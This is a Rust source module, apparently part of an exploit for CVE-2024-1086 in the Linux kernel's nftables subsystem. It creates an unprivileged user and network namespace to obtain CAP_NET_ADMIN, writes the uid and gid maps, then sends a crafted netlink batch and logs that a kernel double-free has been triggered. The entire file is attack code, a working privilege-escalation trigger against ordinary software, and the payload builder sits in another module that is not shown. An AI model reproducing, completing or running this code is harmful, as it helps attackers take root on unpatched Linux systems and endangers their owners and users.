//! Double-free trigger for CVE-2024-1086

use super::netlink::NetlinkSocket;
use super::nftables::ExploitBatch;
use log::{info, debug};
use std::fs::File;
use std::io::Write;

pub struct NamespaceContext {
    pub original_uid: u32,
    pub original_gid: u32,
}

impl NamespaceContext {
    pub fn new() -> Result<Self, String> {
        let uid = unsafe { libc::getuid() };
        let gid = unsafe { libc::getgid() };

        if unsafe { libc::unshare(libc::CLONE_NEWUSER | libc::CLONE_NEWNET) } < 0 {
            return Err(format!("unshare: {}", std::io::Error::last_os_error()));
        }

        Self::write_proc("/proc/self/setgroups", "deny")?;
        Self::write_proc("/proc/self/uid_map", &format!("0 {} 1", uid))?;
        Self::write_proc("/proc/self/gid_map", &format!("0 {} 1", gid))?;

        info!("[NS] CAP_NET_ADMIN acquired");
        Ok(Self { original_uid: uid, original_gid: gid })
    }

    fn write_proc(path: &str, content: &str) -> Result<(), String> {
        File::create(path).and_then(|mut f| f.write_all(content.as_bytes()))
            .map_err(|e| format!("{}: {}", path, e))
    }
}

pub fn execute_trigger(sock: &mut NetlinkSocket, batch: &ExploitBatch) -> Result<(), String> {
    let data = batch.build_trigger_batch(sock);
    debug!("[Trigger] Sending {} bytes", data.len());
    sock.send(&data)?;

    let mut buf = vec![0u8; 65536];
    let n = sock.recv(&mut buf)?;

    if n >= 20 {
        let msg_type = u16::from_ne_bytes([buf[4], buf[5]]);
        if msg_type == 2 {
            let err = i32::from_ne_bytes([buf[16], buf[17], buf[18], buf[19]]);
            if err < 0 { info!("[Trigger] Error {} (expected)", err); }
        }
    }

    info!("[Trigger] Double-free triggered");
    Ok(())
}
